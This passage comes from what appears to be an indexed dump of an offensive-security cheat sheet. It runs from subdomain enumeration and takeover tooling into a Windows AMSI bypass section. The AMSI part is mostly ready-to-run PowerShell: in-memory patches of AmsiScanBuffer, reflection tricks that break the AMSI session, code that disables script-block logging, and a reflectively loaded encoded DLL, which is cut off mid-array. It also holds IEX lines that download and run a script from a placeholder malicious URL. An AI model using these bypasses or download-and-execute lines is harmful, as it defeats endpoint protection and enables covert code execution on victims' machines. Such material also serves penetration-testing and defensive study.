subdomain \"/Discover/DNS\"","text":"<pre><code>git clone https://github.com/guelfoweb/knock\ngit clone https://github.com/danielmiessler/SecLists.git\nknockpy domain.com -w subdomains-top1mil-110000.txt\n</code></pre> <p>Using EyeWitness and Nmap scans from the KnockPy and enumall scans</p> <pre><code>git clone https://github.com/ChrisTruncer/EyeWitness.git\n./setup/setup.sh\n./EyeWitness.py -f filename -t optionaltimeout --open (Optional)\n./EyeWitness -f urls.txt --web\n./EyeWitness -x urls.xml -t 8 --headless\n./EyeWitness -f rdp.txt --rdp\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-google-dorks-and-google-transparency-report","title":"Using Google Dorks and Google Transparency Report","text":"<p>You need to include subdomains ;) https://www.google.com/transparencyreport/https/ct/?hl=en-US#domain=[DOMAIN]g&amp;incl_exp=true&amp;incl_sub=true</p> <pre><code>site:*.domain.com -www\nsite:domain.com filetype:pdf\nsite:domain.com inurl:'&amp;'\nsite:domain.com inurl:login,register,upload,logout,redirect,redir,goto,admin\nsite:domain.com ext:php,asp,aspx,jsp,jspa,txt,swf\nsite:*.*.domain.com\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-sublist3r","title":"Using Sublist3r","text":"<pre><code>To enumerate subdomains of specific domain and show the results in realtime:\npython sublist3r.py -v -d example.com\n\nTo enumerate subdomains and enable the bruteforce module:\npython sublist3r.py -b -d example.com\n\nTo enumerate subdomains and use specific engines such Google, Yahoo and Virustotal engines\npython sublist3r.py -e google,yahoo,virustotal -d example.com\n\npython sublist3r.py -b -d example.com\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-subfinder","title":"Using Subfinder","text":"<pre><code>go get github.com/subfinder/subfinder\n./Subfinder/subfinder --set-config PassivetotalUsername='USERNAME',PassivetotalKey='KEY'\n./Subfinder/subfinder --set-config RiddlerEmail=\"EMAIL\",RiddlerPassword=\"PASSWORD\"\n./Subfinder/subfinder --set-config CensysUsername=\"USERNAME\",CensysSecret=\"SECRET\"\n./Subfinder/subfinder --set-config SecurityTrailsKey='KEY'\n./Subfinder/subfinder -d example.com -o /tmp/results_subfinder.txt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-findomain","title":"Using Findomain","text":"<pre><code>$ wget https://github.com/Edu4rdSHL/findomain/releases/latest/download/findomain-linux\n$ chmod +x findomain-linux\n$ findomain_spyse_token=\"YourAccessToken\"\n$ findomain_virustotal_token=\"YourAccessToken\" \n$ findomain_fb_token=\"YourAccessToken\" \n$ ./findomain-linux -t example.com -o\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-aquatone-old-version-ruby","title":"Using Aquatone - old version (Ruby)","text":"<pre><code>gem install aquatone\nDiscover subdomains : results in ~/aquatone/example.com/hosts.txt\naquatone-discover --domain example.com\naquatone-discover --domain example.com --threads 25\naquatone-discover --domain example.com --sleep 5 --jitter 30\naquatone-discover --set-key shodan o1hyw8pv59vSVjrZU3Qaz6ZQqgM91ihQ\nActive scans : results in ~/aquatone/example.com/urls.txt\naquatone-scan --domain example.com\naquatone-scan --domain example.com --ports 80,443,3000,8080\naquatone-scan --domain example.com --ports large\naquatone-scan --domain example.com --threads 25\nFinal results\naquatone-gather --domain example.com\n</code></pre> <p>Alternatively, you can use the Docker image provided by txt3rob.</p> <pre><code>https://hub.docker.com/r/txt3rob/aquatone-docker/\ndocker pull txt3rob/aquatone-docker\ndocker run -it txt3rob/aquatone-docker aq example.com\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-aquatone-new-version-go","title":"Using Aquatone - new version (Go)","text":"<pre><code># Subfinder version\n./Subfinder/subfinder -d $1 -r 8.8.8.8,1.1.1.1 -nW -o /tmp/subresult$1\ncat /tmp/subresult$1 | ./Aquatone/aquatone -ports large -out /tmp/aquatone$1\n# Amass version\n./Amass/amass -active -brute -o /tmp/hosts.txt -d $1\ncat /tmp/hosts.txt | ./Aquatone/aquatone -ports large -out /tmp/aquatone$1\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-altdns","title":"Using AltDNS","text":"<p>It's recommended to use massdns in order to resolve the result of <code>AltDNS</code></p> <pre><code>WORDLIST_PERMUTATION=\"./Altdns/words.txt\"\npython2.7 ./Altdns/altdns.py -i /tmp/inputdomains.txt -o /tmp/out.txt -w $WORDLIST_PERMUTATION\n</code></pre> <p>Alternatively you can use goaltdns</p>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-massdns","title":"Using MassDNS","text":"<pre><code>DNS_RESOLVERS=\"./resolvers.txt\"\ncat /tmp/results_subfinder.txt | massdns -r $DNS_RESOLVERS -t A -o S -w /tmp/results_subfinder_resolved.txt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-nmap","title":"Using Nmap","text":"<pre><code>nmap -sn --script hostmap-crtsh host_to_scan.tld\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-dnsdumpster","title":"Using dnsdumpster","text":"<pre><code>git clone https://github.com/nmmapper/dnsdumpster\npython dnsdumpster.py -d domainname.com\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#subdomain-take-over","title":"Subdomain take over","text":"<p>Check Can I take over xyz by EdOverflow for a list of services and how to claim (sub)domains with dangling DNS records.</p>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-tko-subs","title":"Using tko-subs","text":"<pre><code>go get github.com/anshumanbh/tko-subs\n./bin/tko-subs -domains=./lists/domains_tkos.txt -data=./lists/providers-data.csv  \n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-hostilesubbruteforcer","title":"Using HostileSubBruteForcer","text":"<pre><code>git clone https://github.com/nahamsec/HostileSubBruteforcer\nchmod +x sub_brute.rb\n./sub_brute.rb\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#using-subover","title":"Using SubOver","text":"<pre><code>go get github.com/Ice3man543/SubOver\n./SubOver -l subdomains.txt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Subdomains%20Enumeration/#references","title":"References","text":"<ul> <li>Subdomain Takeover: Proof Creation for Bug Bounties - Patrik Hudak</li> <li>Subdomain Takeover: Basics - Patrik Hudak</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/","title":"AMSI Bypass","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#summary","title":"Summary","text":"<ul> <li>List AMSI Providers</li> <li>Which Endpoint Protection is Using AMSI</li> <li>Patching amsi.dll AmsiScanBuffer by rasta-mouse</li> <li>Dont use net webclient</li> <li>Amsi ScanBuffer Patch from -&gt; https://www.contextis.com/de/blog/amsi-bypass</li> <li>Forcing an error</li> <li>Disable Script Logging</li> <li>Amsi Buffer Patch - In memory</li> <li>Same as 6 but integer Bytes instead of Base64</li> <li>Using Matt Graeber's Reflection method</li> <li>Using Matt Graeber's Reflection method with WMF5 autologging bypass</li> <li>Using Matt Graeber's second Reflection method</li> <li>Using Cornelis de Plaa's DLL hijack method</li> <li>Use Powershell Version 2 - No AMSI Support there</li> <li>Nishang all in one</li> <li>Adam Chesters Patch</li> <li>AMSI.fail</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#list-amsi-providers","title":"List AMSI Providers","text":"<ul> <li>List providers with : <code>Get-ChildItem -Path 'HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\'</code></li> <li>Find software from CLSID     <pre><code>Get-ChildItem -Path 'HKLM:\\SOFTWARE\\Classes\\CLSID\\{2781761E-28E0-4109-99FE-B9D127C57AFE}'\nName                           Property\n----                           --------\nHosts                          (default) : Scanned Hosting Applications\nInprocServer32                 (default) : \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2210.4-0\\MpOav.dll\"\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#which-endpoint-protection-is-using-amsi","title":"Which Endpoint Protection is Using AMSI","text":"<p>Small extract from subat0mik/whoamsi - An effort to track security vendors' use of Microsoft's Antimalware Scan Interface:</p> Vendor/Product AMSI Date Reference Avast Y 03/20/2016 https://forum.avast.com/index.php?topic=184491.msg1300884#msg1300884 AVG Y 03/08/2016 https://support.avg.com/answers?id=906b00000008oUTAAY BitDefender Consumer Y 09/20/2016 https://forum.bitdefender.com/index.php?/topic/72455-antimalware-scan-service/ BitDefender Enterprise Y 05/25/2021 https://twitter.com/Bitdefender_Ent/status/1397187195669295111?s=20 Kaspersky Anti Targeted Attack Platform Y 10/10/2018 https://help.kaspersky.com/KIS/2019/en-US/119653.htm Symantec Advanced Threat Protection Y 07/15/2020 https://techdocs.broadcom.com/content/broadcom/techdocs/us/en/symantec-security-software/endpoint-security-and-management/endpoint-protection/all/release-notes/Whats-new-for-Symantec-Endpoint-Protection-14_3-.html Microsoft Defender for Endpoint Y 06/09/2015 https://www.microsoft.com/security/blog/2015/06/09/windows-10-to-offer-application-developers-new-malware-defenses/"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#patching-amsidll-amsiscanbuffer-by-rasta-mouse","title":"Patching amsi.dll AmsiScanBuffer by rasta-mouse","text":"<pre><code>$Win32 = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\nAdd-Type $Win32\n$LoadLibrary = [Win32]::LoadLibrary(\"am\" + \"si.dll\")\n$Address = [Win32]::GetProcAddress($LoadLibrary, \"Amsi\" + \"Scan\" + \"Buffer\")\n$p = 0\n[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)\n$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#dont-use-net-webclient","title":"Dont use net webclient","text":"<p>Not Working anymore, there was a patch for it</p> <pre><code>$webreq = [System.Net.WebRequest]::Create(\u2018https://maliciousscripturl/malicious.ps1\u2019)\n$resp=$webreq.GetResponse()\n$respstream=$resp.GetResponseStream()\n$reader=[System.IO.StreamReader]::new($respstream)\n$content=$reader.ReadToEnd()\nIEX($content)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#the-short-version-of-dont-use-powershell-net-webclient","title":"The Short version of dont use powershell net webclient","text":"<p>Not Working anymore, there was a patch for it</p> <pre><code>IEX([Net.Webclient]::new().DownloadString(\"https://maliciousscripturl/malicious.ps1\"))\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#amsi-scanbuffer-patch","title":"Amsi ScanBuffer Patch","text":"<p>Egghunter with blog post: https://www.contextis.com/us/blog/amsi-bypass</p> <pre><code>Write-Host \"-- AMSI Patch\"\nWrite-Host \"-- Paul La\u00een\u00e9 (@am0nsec)\"\nWrite-Host \"\"\n$Kernel32 = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Kernel32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string lpLibFileName);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\nAdd-Type $Kernel32\nClass Hunter {\nstatic [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {\nwhile ($true) {\n[int]$count = 0\nwhile ($true) {\n[IntPtr]$address = [IntPtr]::Add($address, 1)\nIf ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {\n$count++\nIf ($count -eq $egg.Length) {\nreturn [IntPtr]::Subtract($address, $egg.Length - 1)\n}\n} Else { break }\n}\n}\nreturn $address\n}\n}\n[IntPtr]$hModule = [Kernel32]::LoadLibrary(\"amsi.dll\")\nWrite-Host \"[+] AMSI DLL Handle: $hModule\"\n[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, \"DllCanUnloadNow\")\nWrite-Host \"[+] DllCanUnloadNow address: $dllCanUnloadNowAddress\"\nIf ([IntPtr]::Size -eq 8) {\nWrite-Host \"[+] 64-bits process\"\n[byte[]]$egg = [byte[]] (\n0x4C, 0x8B, 0xDC,       # mov     r11,rsp\n0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx\n0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp\n0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi\n0x57,                   # push    rdi\n0x41, 0x56,             # push    r14\n0x41, 0x57,             # push    r15\n0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h\n)\n} Else {\nWrite-Host \"[+] 32-bits process\"\n[byte[]]$egg = [byte[]] (\n0x8B, 0xFF,             # mov     edi,edi\n0x55,                   # push    ebp\n0x8B, 0xEC,             # mov     ebp,esp\n0x83, 0xEC, 0x18,       # sub     esp,18h\n0x53,                   # push    ebx\n0x56                    # push    esi\n)\n}\n[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)\nWrite-Host \"[+] Targeted address: $targetedAddress\"\n$oldProtectionBuffer = 0\n[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null\n$patch = [byte[]] (\n0x31, 0xC0,    # xor rax, rax\n0xC3           # ret  \n)\n[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)\n$a = 0\n[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#forcing-an-error","title":"Forcing an error","text":"<pre><code>$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)\n[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\",\"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\",\"NonPublic,Static\").SetValue($null, [IntPtr]$mem)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#disable-script-logging","title":"Disable Script Logging","text":"<pre><code>$settings = [Ref].Assembly.GetType(\"System.Management.Automation.Utils\").GetField(\"cachedGroupPolicySettings\",\"NonPublic,Static\").GetValue($null);\n$settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"] = @{}\n$settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"].Add(\"EnableScriptBlockLogging\", \"0\")\n</code></pre> <pre><code>[Ref].Assembly.GetType(\"System.Management.Automation.ScriptBlock\").GetField(\"signatures\",\"NonPublic,static\").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#amsi-buffer-patch-in-memory","title":"Amsi Buffer Patch - In memory","text":"<pre><code>function Bypass-AMSI\n{\nif(-not ([System.Management.Automation.PSTypeName]\"Bypass.AMSI\").Type) {     [Reflection.Assembly]::Load([Convert]::FromBase64String(\"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YXJkAERpc2FibGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5SW5mb3JtYXRpb25hbFZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAGR3U2l6ZQBzaXplAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAQWxsb2NIR2xvYmFsAE1hcnNoYWwAS2VybmVsMzIuZGxsAEFtc2lCeXBhc3MuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBvcF9BZGRpdGlvbgBaZXJvAC5jdG9yAFVJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAFJ1bnRpbWVIZWxwZXJzAEFtc2lCeXBhc3MAR2V0UHJvY0FkZHJlc3MAbHBBZGRyZXNzAE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAZGVzdABJbml0aWFsaXplQXJyYXkAQ29weQBMb2FkTGlicmFyeQBSdGxNb3ZlTWVtb3J5AG9wX0VxdWFsaXR5AAARYQBtAHMAaQAuAGQAbABsAABXRQBSAFIATwBSADoAIABDAG8AdQBsAGQAIABuAG8AdAAgAHIAZQB0AHIAaQBlAHYAZQAgAGEAbQBzAGkALgBkAGwAbAAgAHAA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| Out-Null\nWrite-Output \"DLL has been reflected\";\n}\n[Bypass.AMSI]::Patch()\n}\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#same-as-6-but-integer-bytes-instead-of-base64","title":"Same as 6 but integer Bytes instead of Base64","text":"<pre><code>function MyPatch{\nif(-not ([System.Management.Automation.PSTypeName]\"Bypass.AMSI\").Type) {\n[Reflection.Assembly]::Load([byte[]]@(77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0, 184, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 14, 31, 186, 14, 0, 180, 9, 205, 33, 184, 1, 76, 205, 33, 84, 104, 105, 115, 32, 112, 114, 111, 103, 114, 97, 109, 32, 99, 97, 110, 110, 111, 116, 32, 98, 101, 32, 114, 117, 110, 32, 105, 110, 32, 68, 79, 83, 32, 109, 111, 100, 101, 46, 13, 13, 10, 36, 0, 0, 0, 0, 0, 0, 0, 80, 69, 0, 0, 76, 1, 3, 0, 27, 37, 18, 183, 0, 0, 0, 0, 0, 0, 0, 0, 224, 0, 34, 32, 11, 1, 48, 0, 0, 14, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 94, 44, 0, 0, 0, 32, 0, 0, 0, 64, 0, 0, 0, 0, 0, 16, 0, 32, 0, 0, 0, 2, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 3, 0, 64, 133, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 